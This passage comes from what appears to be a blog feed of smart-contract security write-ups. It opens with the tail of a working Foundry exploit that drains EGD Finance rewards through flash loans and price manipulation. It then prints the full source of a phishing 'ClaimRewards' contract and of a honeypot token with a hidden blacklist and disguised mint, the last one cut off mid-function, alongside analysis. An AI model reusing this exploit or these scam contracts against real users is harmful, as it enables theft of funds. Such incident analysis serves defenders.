~uint256(0));</span><br><span class="line">        EGD.approve(address(EGDFinance), ~uint256(0));</span><br><span class="line">        BSC_USD.approve(address(EGDFinance), ~uint256(0));</span><br><span class="line"></span><br><span class="line">        // 攻击前准备：质押stake</span><br><span class="line">        console.log(&quot;[before attack]&quot;);</span><br><span class="line">        console.log(&quot;   stake 100 ether&quot;);</span><br><span class="line">        deal(address(BSC_USD), address(this), 100 ether);</span><br><span class="line">        EGDFinance.bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));</span><br><span class="line">        EGDFinance.stake(100 ether);</span><br><span class="line"></span><br><span class="line">        console.log();</span><br><span class="line">        console.log(&quot;after 10 seconds&quot;);</span><br><span class="line">        // 质押和获取利润一般不可以在同一个交易当中</span><br><span class="line">        // 注意：获取的利润和时间有关系，时间越长，获取的利润就越多。</span><br><span class="line">        //       但是EGDFinance在池子中的EGD余额是有限的，你的利润太多，取完了就会报错。</span><br><span class="line">        //       因此，质押的数量和时间是有讲究的，否则会报错说余额不够。</span><br><span class="line">        //       这里我们选择质押100ETH，并且质押10秒</span><br><span class="line">        vm.warp(block.timestamp + 10);</span><br><span class="line">        console.log();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;[start attack]&quot;);</span><br><span class="line">        emit log_named_decimal_uint(&quot;   [INFO] attackContract BSC-USD Balance&quot;, IERC20(BSC_USD).balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;   [INFO] EGD/BSC-USD Price before price manipulation&quot;, IEGDFinance(EGDFinance).getEGDPrice(), 18);</span><br><span class="line">        console.log(&quot;   Flashloan[1] : borrow 2,000 BSC-USD from BSC-USD/WBNB pool&quot;);</span><br><span class="line">        </span><br><span class="line">        // 发起攻击</span><br><span class="line">        // 我们闪电贷借款2000个BSC-USD，跟攻击事件的一样</span><br><span class="line">        pair_wbnbUSD.swap(FLASHLOANAMOUNT_01, 0, address(this), new bytes(1));</span><br><span class="line">        console.log(&quot;   Flashloan[1] payback success&quot;);</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(&quot;   [INFO] attackContract BSC-USD Balance&quot;, IERC20(BSC_USD).balanceOf(address(this)), 18);</span><br><span class="line"></span><br><span class="line">        IERC20(BSC_USD).transfer(msg.sender, IERC20(BSC_USD).balanceOf(address(this)));        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pancakeCall(address, uint256, uint256, bytes calldata) external&#123;</span><br><span class="line">        if(countFlashloan == false)&#123;</span><br><span class="line">            console.log(&quot;       borrow BSC-USD, the price of BSC-USD decrease&quot;);</span><br><span class="line">            countFlashloan = true;</span><br><span class="line"></span><br><span class="line">            // 第二次闪电贷：借出池子的99.99999925%，好像是说无法借出全部，否则会报流动性余额啥的异常, 如果借少了导致获利减少，不够还款闪电贷</span><br><span class="line">            FLASHLOANAMOUNT_02 = IERC20(BSC_USD).balanceOf(address(pair_egdUSD)) * 9_999_999_925 / 10_000_000_000;</span><br><span class="line">            // FLASHLOANAMOUNT_02 = IERC20(BSC_USD).balanceOf(address(pair_egdUSD)) * 90 / 100;</span><br><span class="line">            console.log(&quot;       Flashloan[2] : borrow 99.99999925% BSC-USD of EGD/BSC-USD pool&quot;);</span><br><span class="line">            pair_egdUSD.swap(0, FLASHLOANAMOUNT_02, address(this), new bytes(1));</span><br><span class="line">            console.log(&quot;       Flashloan[2] payback success&quot;);</span><br><span class="line"></span><br><span class="line">            address[] memory path = new address[](2);</span><br><span class="line">            path[0] = address(EGD);</span><br><span class="line">            path[1] = address(BSC_USD);</span><br><span class="line">            console.log(&quot;       swap: EGD =&gt; BSC-USD&quot;);</span><br><span class="line">            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">                IERC20(EGD).balanceOf(address(this)), 1, path, address(this), block.timestamp</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            // 手续费是至少大于0.25%，我们选择0.26%。如果还太多，我们攻击所得的余额不够也会报错，因此要控制好数量</span><br><span class="line">            uint256 swapfee = (FLASHLOANAMOUNT_01 * 10_000 / 9974) - FLASHLOANAMOUNT_01;</span><br><span class="line">            BSC_USD.transfer(address(pair_wbnbUSD), FLASHLOANAMOUNT_01 + swapfee);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            console.log(&quot;           borrow BSC-USD, the price of BSC-USD decrease again&quot;);</span><br><span class="line">            emit log_named_decimal_uint(&quot;           [INFO] EGD/BSC-USD Price after price manipulation&quot;, IEGDFinance(EGDFinance).getEGDPrice(), 18);</span><br><span class="line"></span><br><span class="line">            console.log(&quot;           Claim all EGD Token reward from EGD Finance contract&quot;);</span><br><span class="line">            EGDFinance.claimAllReward();</span><br><span class="line"></span><br><span class="line">            emit log_named_decimal_uint(&quot;           [INFO] Get reward (EGD token)&quot;, IERC20(EGD).balanceOf(address(this)), 18);</span><br><span class="line">            </span><br><span class="line">            // 手续费是至少大于0.25%，我们选择0.26%。如果还太多，我们攻击所得的余额不够也会报错，因此要控制好数量</span><br><span class="line">            uint256 swapfee = (FLASHLOANAMOUNT_02 * 10_000 / 9974) - FLASHLOANAMOUNT_02;</span><br><span class="line">            BSC_USD.transfer(address(pair_egdUSD), FLASHLOANAMOUNT_02 + swapfee);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>质押之后，应该等一段时间才能领取利润</li><li>价格计算的规则太简单，被操控</li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.Phishing scam</title>
      <link href="/2023/10/23/08.PoC/01.Phishing%20scam/"/>
      <url>/2023/10/23/08.PoC/01.Phishing%20scam/</url>
      
        <content type="html"><![CDATA[<h1 id="Phishing-scam"><a href="#Phishing-scam" class="headerlink" title="Phishing scam"></a>Phishing scam</h1><h2 id="brief"><a href="#brief" class="headerlink" title="brief"></a>brief</h2><ul><li><p>Mainnet：0x000011387Eb24F199e875B1325E4805EfD3b0000 </p></li><li><p><a href="https://etherscan.io/address/0x000011387Eb24F199e875B1325E4805EfD3b0000">link</a></p></li><li><p><a href="https://twitter.com/salus_sec/status/1679331500452634624">twitter</a></p></li></ul><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>The contract is so simple:</p><ul><li>abstract contract Context: normal</li><li>Ownable: normal</li><li>ClaimRewards: only owner can call <code>withdraw()</code>. The other functions contain nothing but receive money</li></ul><p>The web3 world is so noisy, why there is so many stupid guys? The contract has been verified, but they don’t have a glance even.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *Submitted for verification at Etherscan.io on 2023-06-22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// File: @openzeppelin/contracts/utils/Context.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Provides information about the current execution context, including the</span><br><span class="line"> * sender of the transaction and its data. While these are generally available</span><br><span class="line"> * via msg.sender and msg.data, they should not be accessed in such a direct</span><br><span class="line"> * manner, since when dealing with meta-transactions the account sending and</span><br><span class="line"> * paying for execution may not be the actual sender (as far as an application</span><br><span class="line"> * is concerned).</span><br><span class="line"> *</span><br><span class="line"> * This contract is only required for intermediate, library-like contracts.</span><br><span class="line"> */</span><br><span class="line">abstract contract Context &#123;</span><br><span class="line">    function _msgSender() internal view virtual returns (address) &#123;</span><br><span class="line">        return msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _msgData() internal view virtual returns (bytes calldata) &#123;</span><br><span class="line">        return msg.data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: @openzeppelin/contracts/access/Ownable.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Contract module which provides a basic access control mechanism, where</span><br><span class="line"> * there is an account (an owner) that can be granted exclusive access to</span><br><span class="line"> * specific functions.</span><br><span class="line"> *</span><br><span class="line"> * By default, the owner account will be the one that deploys the contract. This</span><br><span class="line"> * can later be changed with &#123;transferOwnership&#125;.</span><br><span class="line"> *</span><br><span class="line"> * This module is used through inheritance. It will make available the modifier</span><br><span class="line"> * `onlyOwner`, which can be applied to your functions to restrict their use to</span><br><span class="line"> * the owner.</span><br><span class="line"> */</span><br><span class="line">abstract contract Ownable is Context &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Initializes the contract setting the deployer as the initial owner.</span><br><span class="line">     */</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _transferOwnership(_msgSender());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Throws if called by any account other than the owner.</span><br><span class="line">     */</span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        _checkOwner();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the address of the current owner.</span><br><span class="line">     */</span><br><span class="line">    function owner() public view virtual returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Throws if the sender is not the owner.</span><br><span class="line">     */</span><br><span class="line">    function _checkOwner() internal view virtual &#123;</span><br><span class="line">        require(owner() == _msgSender(), &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Leaves the contract without owner. It will not be possible to call</span><br><span class="line">     * `onlyOwner` functions. Can only be called by the current owner.</span><br><span class="line">     *</span><br><span class="line">     * NOTE: Renouncing ownership will leave the contract without an owner,</span><br><span class="line">     * thereby disabling any functionality that is only available to the owner.</span><br><span class="line">     */</span><br><span class="line">    function renounceOwnership() public virtual onlyOwner &#123;</span><br><span class="line">        _transferOwnership(address(0));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Transfers ownership of the contract to a new account (`newOwner`).</span><br><span class="line">     * Can only be called by the current owner.</span><br><span class="line">     */</span><br><span class="line">    function transferOwnership(address newOwner) public virtual onlyOwner &#123;</span><br><span class="line">        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Transfers ownership of the contract to a new account (`newOwner`).</span><br><span class="line">     * Internal function without access restriction.</span><br><span class="line">     */</span><br><span class="line">    function _transferOwnership(address newOwner) internal virtual &#123;</span><br><span class="line">        address oldOwner = _owner;</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">        emit OwnershipTransferred(oldOwner, newOwner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// File: contracts/main.sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract ClaimRewards is Ownable &#123;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        // The Ownable constructor sets the owner to the address that deploys the contract</span><br><span class="line">        transferOwnership(0x0000553F880fFA3728b290e04E819053A3590000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount, address recipient) public onlyOwner &#123;</span><br><span class="line">        require(amount &lt;= address(this).balance, &quot;Requested amount exceeds the contract balance.&quot;);</span><br><span class="line">        require(recipient != address(0), &quot;Recipient address cannot be the zero address.&quot;);</span><br><span class="line">        payable(recipient).call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Claim() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Confirm() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Verify() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function Connect() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Start() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Gift() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Enable() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.A mythical wild animal</title>
      <link href="/2023/10/22/08.PoC/02.A%20mythical%20wild%20animal/"/>
      <url>/2023/10/22/08.PoC/02.A%20mythical%20wild%20animal/</url>
      
        <content type="html"><![CDATA[<h1 id="A-mythical-wild-animal"><a href="#A-mythical-wild-animal" class="headerlink" title="A mythical wild animal"></a>A mythical wild animal</h1><h2 id="brief"><a href="#brief" class="headerlink" title="brief"></a>brief</h2><ul><li><p>twitter：<a href="https://twitter.com/BeosinAlert/status/1676057831550906368?s=20">https://twitter.com/BeosinAlert/status/1676057831550906368?s=20</a></p></li><li><p>Hacker address: slot[ Guest private _guest]: 0x000000000000000000000000f7e0d99511eab452bcbbdc34285e25f10e28f79d</p></li><li><p>token: <a href="https://etherscan.io/address/0x8b99bb8ddd8103cbeccc3b20c4b0038ca65a51ae">https://etherscan.io/address/0x8b99bb8ddd8103cbeccc3b20c4b0038ca65a51ae</a></p></li><li><p>Liquidity pool: <a href="https://etherscan.io/token/0x8b99bb8ddd8103cbeccc3b20c4b0038ca65a51ae">https://etherscan.io/token/0x8b99bb8ddd8103cbeccc3b20c4b0038ca65a51ae</a></p></li><li><p>one tx of adding victims to blacklist: <a href="https://etherscan.io/tx/0x9727f0e7cbfac6af493cacc9bfb8781b06fa0d45cba8927de7fef0438b1972b8">https://etherscan.io/tx/0x9727f0e7cbfac6af493cacc9bfb8781b06fa0d45cba8927de7fef0438b1972b8</a></p></li></ul><p><img src="https://moe.photo/images/2023/07/14/image-20230714220446313.png" alt></p><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>1.The hacker create ERC20 pair in uniswap V2: WETH and token MIKE. </p><p><img src="https://moe.photo/images/2023/07/14/image-20230714223118345.png" alt></p><p>2.The victims use WETH to buy token MIKE in the liquidity pool of uniswap V2. </p><p>3.The hacker adds victims into blacklist and mints token to himself.</p><p><img src="https://moe.photo/images/2023/07/14/image-20230714220813225.png" alt></p><p>4.When victims call <code>transferFrom()</code> , the transaction will fail because they r in blacklist. In this case, there will be more and more WETHs in the pool, with fewer and fewer tokens, resulting in tokens becoming increasingly valuable. </p><p>5.Victims cann’t transfer token MIKE, only the hacker can. </p><p>6.The hacker can mint token MIKE infinitely by <code>incrementAllowance()</code>. With infinite money, hacker could get all the WETH in liquidity pool.</p><p>My analyses is included in the following code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.18;</span><br><span class="line"></span><br><span class="line">contract Mike is IERC20, Token, Ownable &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    struct Guest &#123;</span><br><span class="line">        address guest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; address) private _dex; // blacklist</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">    Guest private _guest;</span><br><span class="line">    string private _name;</span><br><span class="line">    string private _symbol;</span><br><span class="line">    uint8 private _decimals;</span><br><span class="line">    uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor( string memory name_, string memory symbol_, address user_, uint256 totalSupply_) payable &#123;</span><br><span class="line">        _name = name_;</span><br><span class="line">        _symbol = symbol_;</span><br><span class="line">        _decimals = 18;</span><br><span class="line">        _guest.guest = user_;</span><br><span class="line">        // hakcer mint for the first, victims will thought this will be the whole token supply,</span><br><span class="line">        // because they don&#x27;t see any mint() function. In fact, increaseAllowance() can mint token but</span><br><span class="line">        // only hacker can.</span><br><span class="line">        _mint(msg.sender, totalSupply_ * 10**18); </span><br><span class="line">        emit Deploy(</span><br><span class="line">            owner(),</span><br><span class="line">            VERSION</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function name() public view virtual returns (string memory) &#123;</span><br><span class="line">        return _name;</span><br><span class="line">    &#125;</span><br><span class="line">    function symbol() public view virtual returns (string memory) &#123;</span><br><span class="line">        return _symbol;</span><br><span class="line">    &#125;</span><br><span class="line">    function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">        return _decimals;</span><br><span class="line">    &#125;</span><br><span class="line">    function totalSupply() public view virtual override returns (uint256) &#123;</span><br><span class="line">        return _totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">    function balanceOf(address account) public view virtual override returns (uint256)&#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        _transfer(_msgSender(), recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender) public view virtualoverride returns (uint256)&#123;</span><br><span class="line">        return _allowances[owner][spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public virtual override returns (bool)&#123;</span><br><span class="line">        _approve(_msgSender(), spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom( address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        _approve(</span><br><span class="line">            sender,</span><br><span class="line">            _msgSender(),</span><br><span class="line">            _allowances[sender][_msgSender()].sub(</span><br><span class="line">                amount,</span><br><span class="line">                &quot;IERC20: transfer amount exceeds allowance&quot;</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">////////////////////////// can&#x27;t transfer //////////////////////////////////////   </span><br><span class="line">    function _transfer( address sender,address recipient, uint256 amount) internal virtual &#123;</span><br><span class="line">        _requireBalance(sender, recipient, amount); // victims can&#x27;t pass this! the tx will revert!</span><br><span class="line">        require(sender != address(0), &quot;IERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(recipient != address(0),&quot;IERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(sender, recipient, amount); //do nothing</span><br><span class="line">        _balances[sender] = _balances[sender].sub(amount,&quot;IERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        _balances[recipient] = _balances[recipient] + amount;</span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">    &#125; </span><br><span class="line">////////////////////////// can&#x27;t transfer //////////////////////////////////////   </span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;IERC20: mint to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(address(0), account, amount); //do nothing</span><br><span class="line"></span><br><span class="line">        _totalSupply = _totalSupply.add(amount);</span><br><span class="line">        _plus(account, amount);</span><br><span class="line">        emit Transfer(address(0), account, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;IERC20: burn from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(account, address(0), amount); //do nothing</span><br><span class="line">        require(amount != 0, &quot;Invalid amount&quot;);</span><br><span class="line">        _minus(account, amount);</span><br><span class="line">        _totalSupply = _totalSupply.sub(amount);</span><br><span class="line">        emit Transfer(account, address(0), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _minus(address account, uint256 amount) internal &#123;</span><br><span class="line">        _balances[account] = _balances[account] - amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _plus(address account, uint256 amount) internal &#123;</span><br><span class="line">        _balances[account] = _balances[account] + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve( address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(owner != address(0), &quot;IERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;IERC20: approve to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">        emit Approval(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">////////////////////////// equil to mint but only hacker can call //////////////////////////////////////   </span><br><span class="line">    function increaseAllowance(address spender, uint256 amount) public virtual &#123;</span><br><span class="line">        address from = msg.sender;</span><br><span class="line">        